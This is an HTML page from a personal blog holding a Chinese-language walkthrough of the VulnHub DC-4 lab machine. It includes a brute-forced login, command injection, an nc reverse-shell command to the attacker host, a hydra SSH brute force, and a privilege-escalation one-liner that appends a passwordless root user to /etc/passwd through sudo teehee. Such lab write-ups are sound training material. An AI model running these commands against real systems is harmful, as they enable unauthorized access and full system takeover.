@@ -1,0 +1,263 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DC-4靶场 | 榴莲酥的碎碎念</title>
+<link rel="shortcut icon" href="https://dengdinshan.github.io/favicon.ico?v=1730519803442">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://dengdinshan.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DC-4靶场 | 榴莲酥的碎碎念 - Atom Feed" href="https://dengdinshan.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="DC-4
+靶场下载地址  https://www.vulnhub.com/entry/dc-4,313/
+下载下来后是 .ova 格式，建议使用vitualbox进行搭建，vmware可能存在兼容性问题。靶场推荐使用NAT(共享)模式，桥接..." />
+    <meta name="keywords" content="靶场" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://dengdinshan.github.io">
+  <img class="avatar" src="https://dengdinshan.github.io/images/avatar.png?v=1730519803442" alt="">
+  </a>
+  <h1 class="site-title">
+    榴莲酥的碎碎念
+  </h1>
+  <p class="site-description">
+    天下有情人终成眷属
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DC-4靶场
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-10-16
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://dengdinshan.github.io/tag/ne0Z-hhZT/" class="post-tag">
+                  # 靶场
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="dc-4">DC-4</h1>
+<p>靶场下载地址  https://www.vulnhub.com/entry/dc-4,313/</p>
+<p>下载下来后是 .ova 格式，建议使用vitualbox进行搭建，vmware可能存在兼容性问题。靶场推荐使用NAT(共享)模式，桥接模式可能会造成目标过多不易识别。</p>
+<p>如果当你找不到靶机在哪的时候 可以来试试这个</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102309171.png" alt="image-20241010230912114" loading="lazy"></figure>
+<p>步入正题</p>
+<p>kali  192.168.56.102</p>
+<p>靶机 192.168.56.108</p>
+<p>想问我怎么知道靶机ip地址？</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102325953.png" alt="image-20241010232537897" loading="lazy"></figure>
+<p>ip地址知道了 那就来看看开放了什么端口吧</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102327942.png" alt="image-20241010232702884" loading="lazy"></figure>
+<p>开放了80段口我们当然首先就来看看呗</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102329297.png" alt="image-20241010232906237" loading="lazy"></figure>
+<p>使用dirseach进行一下简单的扫目</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102332579.png" alt="image-20241010233225497" loading="lazy"></figure>
+<p>发现所有php网页都是跳转到index.php，因此无论如何都要登录进去得了。</p>
+<p>那就试试弱口令吧</p>
+<p>直接丢进burp一波爆破，爆出账号admin，密码happy</p>
+<p>登录之后发现来到了一个命令执行的界面</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102348836.png" alt="image-20241010234810794" loading="lazy"></figure>
+<p>使用burp抓个包看看能否截获。</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102349871.png" alt="image-20241010234924821" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102353179.png" alt="image-20241010235329116" loading="lazy"></figure>
+<p>发现只要修改radio的值就能修改执行的命令</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110024832.png" alt="image-20241011002440753" loading="lazy"></figure>
+<p>试试ip+add命令</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110028827.png" alt="image-20241011002853768" loading="lazy"></figure>
+<p>查看login.php 可以得到账号密码</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110055325.png" alt="image-20241011005508256" loading="lazy"></figure>
+<p>以及可以查看到</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110103127.png" alt="image-20241011010338055" loading="lazy"></figure>
+<p>由于没有写入文件的权限 决定使用命令执行漏洞nc进行反弹shell</p>
+<p>在kali上先开启侦听8080端口</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110106120.png" alt="image-20241011010627082" loading="lazy"></figure>
+<p>再修改命令执行的命令</p>
+<p>nc 192.168.56.102 8080 -e /bin/bash</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110114036.png" alt="image-20241011011430993" loading="lazy"></figure>
+<p>已经成功咯 来试试命令</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110117944.png" alt="image-20241011011725904" loading="lazy"></figure>
+<p>可以看到kali中获得了shell</p>
+<p>使用python获得交互式界面</p>
+<p>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110122503.png" alt="image-20241011012209469" loading="lazy"></figure>
+<p>登录进来就是www-data用户。</p>
+<p>翻阅各目录 可以在/home中找到了三个用户 其中只有jim用户中存在文件</p>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110135596.png" alt="image-20241011013510554" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111134037.png" alt="image-20241011113442971" loading="lazy"></figure>
+<p>查看各文件  发现test.sh就是个循环四五遍的echo测试  mbox没有权限看不了 backups是一个目录</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111139051.png" alt="image-20241011113959012" loading="lazy"></figure>
+<p>进入backups目录发现backups中有文件old_passwords.bak密码备份文件</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111142279.png" alt="image-20241011114204241" loading="lazy"></figure>
+<p>那我们将文件保存下来进行爆破</p>
+<p>hydra -l jim -P 123.txt 192.168.56.108 ssh</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111228657.png" alt="image-20241011122804581" loading="lazy"></figure>
+<p>爆破出jim的ssh密码为：jibril04</p>
+<p>ssh jim@192.168.56.108</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111233162.png" alt="image-20241011123327119" loading="lazy"></figure>
+<p>直接ssh连上去。sudo -l看一下能执行什么管理员权限，结果直接sudo就没有权限。内核漏洞更是不存在。</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111235333.png" alt="image-20241011123545293" loading="lazy"></figure>
+<p>发现有一个邮件  是来自root用户发送的</p>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111234437.png" alt="image-20241011123428396" loading="lazy"></figure>
+<p>进入邮件目录   cd var/spool/mail</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111254733.png" alt="image-20241011125452693" loading="lazy"></figure>
+<p>查看邮件</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111255229.png" alt="image-20241011125559153" loading="lazy"></figure>
+<p>可以看到发件人的账号和密码</p>
+<p>账号：Charles</p>
+<p>密码：^xHhA&amp;hvim0y</p>
+<p>直接su 切换用户试试</p>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111258542.png" alt="image-20241011125826498" loading="lazy"></figure>
+<p>成功了</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111259415.png" alt="image-20241011125912373" loading="lazy"></figure>
+<p>查看 使用sudo运行的命令</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111303988.png" alt="image-20241011130311933" loading="lazy"></figure>
+<p>看到一个teehee提权   查看teehee有什么用法</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111309464.png" alt="image-20241011130914408" loading="lazy"></figure>
+<p>-a 参数可以追加文件，但不会覆盖 那我们可以用teehee写一些信息到/etc/passwd里面  在passwd中加一个root权限的用户    teehee是可以以无密码以sudo执行的</p>
+<p>/etc/passwd 内每个字段含义</p>
+<p>username:password:User</p>
+<p>ID:Group ID:comment:home directory:shell</p>
+<p>写入  echo &quot;liuliansu::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd<br>
+<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111311464.png" alt="image-20241011131152422" style="zoom:200%;" /></p>
+<p>su liuliansu</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111312193.png" alt="image-20241011131228157" loading="lazy"></figure>
+<p>就这样获取到了root权限</p>
+<p>进入root目录即可找到flag</p>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111313903.png" alt="image-20241011131357821" loading="lazy"></figure>
+<p>总结</p>
+<p>用反弹shell真的是蚌埠住 ctrl+c就退回到了终端...难崩</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#dc-4">DC-4</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://dengdinshan.github.io/post/xin-xi-sou-ji/">
+              <h3 class="post-title">
+                信息搜集
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  总访客人数量3496次 本站总访问量7215次
+  <a class="rss" href="https://dengdinshan.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
